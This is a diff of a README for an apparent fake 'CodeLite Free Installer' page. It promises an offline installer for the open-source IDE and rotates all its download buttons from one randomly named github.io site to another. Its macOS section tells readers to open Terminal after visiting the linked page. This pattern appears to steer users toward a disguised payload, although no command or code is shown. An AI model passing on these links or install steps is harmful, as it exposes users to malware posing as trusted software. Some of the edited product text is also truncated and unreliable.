@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-C/C+++IDE-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-IDE-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 CodeLite Free Installer** — CodeLite is a free, open-source C, C++, PHP, and JavaScript IDE for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
+**💻 CodeLite Free Installer** — CodeLite is a free, open-source, cross-platform C, C++, PHP, and Node. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install CodeLite](https://img.shields.io/badge/⬇_Install_CodeLite-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install CodeLite](https://img.shields.io/badge/⬇_Install_CodeLite-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About CodeLite
 
-CodeLite is a free, open-source C, C++, PHP, and JavaScript IDE for Windows, macOS, and Linux. Features include smart completion, integrated debugger, Git support, a plugin system, and a remote development mode over SSH. CodeLite's lightweight design compared to Eclipse or VS makes it a good choice for developers who want a capable open-source IDE without heavy resource demands.
+CodeLite is a free, open-source, cross-platform C, C++, PHP, and Node.js IDE. Lightweight compared to Eclipse or Visual Studio, it provides syntax highlighting, code completion, debugging, and an integrated terminal for efficient development.
 
 ---
 
 ## ❌ Problem: CodeLite is hard to access
 
-- **Community Size** — Much smaller user base than major IDEs
-- **Plugin Ecosystem** — Limited plugin selection compared to mainstream IDEs
-- **Documentation** — Less comprehensive documentation than commercial alternatives
-- **Modern C++ Intelligence** — Code analysis less sophisticated than CLion
+- **Limited Language Support** — Best for C/C++ and PHP; other language support more basic
+- **Smaller Community** — Fewer plugins and tutorials than VS Code or Eclipse
+- **Dated Interface** — Visual design less modern than contemporary IDEs
+- **Development Pace** — Updates arrive less frequently than mainstream IDEs
 
 ---
 
@@ -61,9 +61,9 @@ CodeLite is a free, open-source C, C++, PHP, and JavaScript IDE for Windows, mac
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ CodeLite is a free, open-source C, C++, PHP, and JavaScript IDE for Windows, mac
 
 <div align="center">
 
-[![⬇ Install CodeLite](https://img.shields.io/badge/⬇_Install_CodeLite-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install CodeLite](https://img.shields.io/badge/⬇_Install_CodeLite-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ CodeLite is a free, open-source C, C++, PHP, and JavaScript IDE for Windows, mac
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ CodeLite is a free, open-source C, C++, PHP, and JavaScript IDE for Windows, mac
 
 ---
 
-**CodeLite Free Installer** — CodeLite is a free, open-source C, C++, PHP, and JavaScript IDE for Windows, macOS, and Linux. Install without internet connection today!
+**CodeLite Free Installer** — CodeLite is a free, open-source, cross-platform C, C++, PHP, and Node. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install CodeLite](https://img.shields.io/badge/⬇_Install_CodeLite-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install CodeLite](https://img.shields.io/badge/⬇_Install_CodeLite-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
